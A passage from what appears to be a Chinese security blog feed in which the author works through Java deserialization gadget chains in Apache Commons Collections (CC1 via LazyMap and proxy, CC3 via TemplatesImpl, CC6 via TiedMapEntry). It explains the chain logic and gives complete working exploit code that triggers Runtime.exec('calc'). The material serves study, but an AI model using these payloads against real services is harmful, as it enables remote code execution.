class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>      <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,instantiateTransformer);<br>      Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>      Constructor&lt;?&gt; constructor2 = c.getDeclaredConstructor(Class.class, Map.class);<br>      constructor2.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor2.newInstance(Target.class, lazyMap);<br>      <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor2.newInstance(Override.class, mapProxy);<br>      serialize(o);<br>      unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>报错：</p><p><img src="/2025/04/23/CC3/image-20250422202323139-174541231917323.png" alt="image-20250422202323139"></p><p>原因:CC1在前面触发invoke方法时，就已经给get方法参数赋String类型的值了</p><p>而我们目标要利用的InstantiateTransformer.transform()方法需要将参数强转成Class</p><p>(主要是transform(xx)在利用连中由其他类的方法调用时,xx不可控)</p><p><img src="/2025/04/23/CC3/image-20250423192324403-174541232067024.png" alt="image-20250423192324403"></p><p><img src="/2025/04/23/CC3/image-20250423192909345-174541232217425.png" alt="image-20250423192909345"></p><p><img src="/2025/04/23/CC3/image-20250423202204935-174541232414326.png" alt="image-20250423202204935"></p><p>所以还是得用ChainedTransformer + ConstantTransformer 给它包裹起来</p><h4 id="完整EXP-InstantiateTransformer）"><a href="#完整EXP-InstantiateTransformer）" class="headerlink" title="完整EXP(InstantiateTransformer）"></a><strong>完整EXP(InstantiateTransformer）</strong></h4><p><strong>CC1+CC3(InstantiateTransformer)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br> Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br> nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br> nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br> bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br> <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br> <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br> bytecodes.set(templates,codes);<br><span class="hljs-comment">// Field tfactory = c1.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//tfactory.setAccessible(true);</span><br><span class="hljs-comment">// tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">// templates.newTransformer();</span><br><br><br><br> <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><span class="hljs-comment">// instantiateTransformer.transform(TrAXFilter.class);</span><br><br> Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>         <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>         instantiateTransformer<br><br> &#125;;<br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br> <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map,chainedTransformer);<br> <br> Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br> Constructor&lt;?&gt; constructor2 = c.getDeclaredConstructor(Class.class, Map.class);<br> constructor2.setAccessible(<span class="hljs-literal">true</span>);<br> <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor2.newInstance(Target.class, lazyMap);<br> <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor2.newInstance(Override.class, mapProxy);<br> serialize(o);<br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>CC6+CC3(InstantiateTransformer)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br><span class="hljs-comment">//        Field tfactory = c1.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><br><span class="hljs-comment">//        Class&lt;TrAXFilter&gt; trAXFilterClass = TrAXFilter.class;</span><br><span class="hljs-comment">//        trAXFilterClass.getDeclaredConstructor(Templates.class).newInstance(templates);</span><br>       <span class="hljs-comment">// templates.newTransformer();</span><br><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>       <span class="hljs-comment">// instantiateTransformer.transform(TrAXFilter.class);</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>( lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">//      tiedMapEntry.getValue();</span><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryFiled.set(lazyMap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CC1_LazyMap &amp;&amp; CC6</title>
    <link href="/2025/04/19/CC1-LazyMap-CC6/"/>
    <url>/2025/04/19/CC1-LazyMap-CC6/</url>
    
    <content type="html"><![CDATA[<p>CC1_LazyMap.get.transform  &amp;&amp; CC6 </p><span id="more"></span><h2 id="CC1-LazyMap-get-transform"><a href="#CC1-LazyMap-get-transform" class="headerlink" title="CC1_LazyMap.get.transform"></a>CC1_LazyMap.get.transform</h2><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250427210510167-17457592172297.png" alt="image-20250427210510167"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>前面学习的是TransformedMap.checkSetValue.transform,现在学习LazyMap.get.transform</p><p>找到LazyMap的get方法里面，调了factory.transform</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250418141717888-17454119912903.png" alt="image-20250418141717888"></p><p>factory是Transformer类</p><p>但LazyMap构造器是protect，还是用静态方法decorate传参返回创建的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250417204012858-17454119935824.png" alt="image-20250417204012858"></p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250417203953189-17454119958835.png" alt="image-20250417203953189"></p><p>之后找谁里面有调get，找到还是AnnotationInvocationHander   invoke方法里有调到get方法， Map 类的memberValues也可控,传lazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>      <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor2</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>      constructor2.setAccessible(<span class="hljs-literal">true</span>);<br>     constructor2.newInstance(Target.class, lazyMap);<br></code></pre></td></tr></table></figure><p>要触发AnnotationInvocationHander 的invoke方法,想到动态代理</p><p>因为刚好AnnotationInvocationHander实现InvocationHandler，也相当于一个动态代理类,它代理一个类，那个类调用方法，就触发动态代理类AnnotationInvocationHander的invoke方法就可以来调到LazyMap.get</p><p>还有AnnotationInvocationHander的invoke方法两个if条件： 不能调equal方法，不能调有参方法</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250418204935625-17454119984266.png" alt="image-20250418204935625"></p><p>而且还要与readObject连上</p><p>恰好因为AnnotationInvocationHandler接受Map类对象，反序列化AnnotationInvocationHandler对象，readObject里面会调Map类对象的entrySet方法</p><p>这个方法也能绕过上面两个if条件</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250418205902809-17454120004737.png" alt="image-20250418205902809"></p><p><strong>所以：动态代理类AnnotationInvocationHandler（即Proxy.newProxyInstance时传入的调用处理器）代理AnnotationInvocationHandler接受的Map类对象，使得反序列化时会因调传入的Map类对象方法，触发动态代理类的invoke方法从而调到LazyMap.get</strong></p><p>执行：AnnotationInvocationHandler.readObject.(执行mapProxy.entrySet触发动态代理invoke)–&gt;AnnotationInvocationHandler.invoke.(memberValues.get)–&gt;lazyMap.get.(factory.transform)–&gt;ChainedTransformer.transform</p><h3 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br> <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br> <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor2</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br> constructor2.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor2.newInstance(Target.class, lazyMap);<span class="hljs-comment">//连接AnnotationInvocationHandler.invoke   lazyMap.get</span><br> <span class="hljs-comment">//上面这儿强转是因为Proxy.newProxyInstance方法第三个参数是接口InvocationHandler类的</span><br> <span class="hljs-comment">//调AnnotationInvocationHandler.invoke.get</span><br> <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br> <span class="hljs-comment">//动态代理类传h，使得后面调用代理类mapProxy的方法时，触发动态代理类的invoke方法</span><br><br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor2.newInstance(Override.class, mapProxy);<br> serialize(o);<br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>CC1:</p><p>LazyMap:<br>AnnotationInvocationHandler.readObject.Map.setEntry</p><p>​AnnotationInvocationHandler.invoke.memberValues.get</p><p>​LazyMap.get.factor.transform</p><p>​.ChainedTransformed.transform</p><p>​ ConstantTransformer.tansform</p><p>​ InvokerTransformer.tansform</p><p><strong>版本：</strong></p><p>jdk8u_71:AnnotationInvocationHandler.readObject中没有调setValue，就没有TransformedMap这条链了</p><p>由于动态代理反序列化的影响，LazyMap这条链也不能用了</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250427210417295-17457590811316.png" alt="image-20250427210417295"></p><p>cc1受版本的影响，cc6不受版本的影响</p><p>后面LazyMap.get.ChainedTransformer.transform与CC1一样</p><p>不同的是：</p><p>hashMap的readObject里面调hash方法，key.hashCode–&gt;TiedMapEntry.hashCode.getValue–&gt;TiedMapEntry.map.get(key)–&gt;LazyMap.get</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>找到TiedMapEntry.getValue调了get方法，它自己的<strong>hashCode</strong>调了getValue方法</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250419170855286-17454120039598.png" alt="image-20250419170855286"></p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250419161026141-17454120056809.png" alt="image-20250419161026141"></p><p>所以下面的构造与前面学的URLdns链一样</p><p>HashMap.readObject.hash–&gt;key.hashCode</p><p>并且还是得注意put的时候就会触发hash,hashCode，就要处理一下这儿</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250419144044529-174541200767810.png" alt="image-20250419144044529"></p><p>对put这儿的处理是与后续利用链有关的</p><p>回顾一下在URLdns中，后续利用链URL的hashCode中进行if判断后执行，所以反射修改hashCode值非-1防止触发</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250419162338708-174541200932911.png" alt="image-20250419162338708"></p><p>这里套的层数多，可修改的范围也大</p><h4 id="防止put触发利用链"><a href="#防止put触发利用链" class="headerlink" title="防止put触发利用链"></a>防止put触发利用链</h4><p>直接从LazyMap.get.factor.transform 这里断开</p><p>factor先放一个其他的不在构造链上的东西，put后再反射修改回来</p><p>decorate第二个参数是Transformer类的，所以传ContantTransformer就可以</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250419165218944-174541201125312.png" alt="image-20250419165218944"></p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250419165240667-174541201276013.png" alt="image-20250419165240667"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>       &#125;;<br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>       HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>       Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>( lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>       HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>       Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>       factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>       factoryFiled.set(lazyMap,chainedTransformer);<br><br>       serialize(o);<br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><h4 id="处理put对lazyMap-get调后续利用链的影响"><a href="#处理put对lazyMap-get调后续利用链的影响" class="headerlink" title="处理put对lazyMap.get调后续利用链的影响"></a>处理put对lazyMap.get调后续利用链的影响</h4><p>修改之后却没有弹出计算器来？？</p><p>调试看到执行put时，调到LazyMap.get方法里面map没有key就会put key(也就是LazyMap类的这么一个功能)，所以这里就已经放入key并返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>       Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br></code></pre></td></tr></table></figure><p>这儿的key来自TiedMapEntry.getValue.get(key），即实例化TiedMapEntry时传的aaa</p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250427082747776-17457136768295.png" alt="image-20250427082747776"></p><p><img src="/2025/04/19/CC1-LazyMap-CC6/image-20250419172137717-174541201595314.png" alt="image-20250419172137717"></p><p>所以反序列化的时候执行到LazyMap的get时map有key值，就不会调factor.transform了，也就不会触发后面的链</p><p>在put后删除key就可以了</p><p>所以put的时候需要有两点注意：</p><ol><li>会触发hashCode，消耗利用链，注意修改避开</li><li>跳转到LazyMap时，由于没有key会进入if返回有key的map，等到反序列化的时候，还是执行到LazyMap时，有key就不会进入if调后续利用连了</li></ol><h3 id="最终EXP-1"><a href="#最终EXP-1" class="headerlink" title="最终EXP"></a>最终EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<span class="hljs-comment">//之后在ChainedTransformer中遍历数组调ConstantTransformer的transform直接返回Runtime.class,作为下一个调transform的参数</span><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><span class="hljs-comment">//模糊：调lazyMap的get时，get里面传参（xx）-&gt;即chainedTransformer.transform(xx),返回去重新看cc1，</span><br><span class="hljs-comment">//因为后面往LazyMAap.decorate()传ChainedTransformer,调它的transform(),即循环调数组的Transformer[]的transform方法，数组第一个就是ConstantTransform，它的transform方法返回的与transform()括号里面的参数无关</span><br><span class="hljs-comment">//所以不用在这儿传，用它默认的就行</span><br><br><br><span class="hljs-comment">//TiedMapEntry的getValue方法调用了key.get方法</span><br><span class="hljs-comment">//TiedMapEntry的hashCode调了它的getValue</span><br><span class="hljs-comment">//hashCode这儿再往前就与URLdns链一样了</span><br><span class="hljs-comment">//readObject的hash(key)</span><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>( lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span 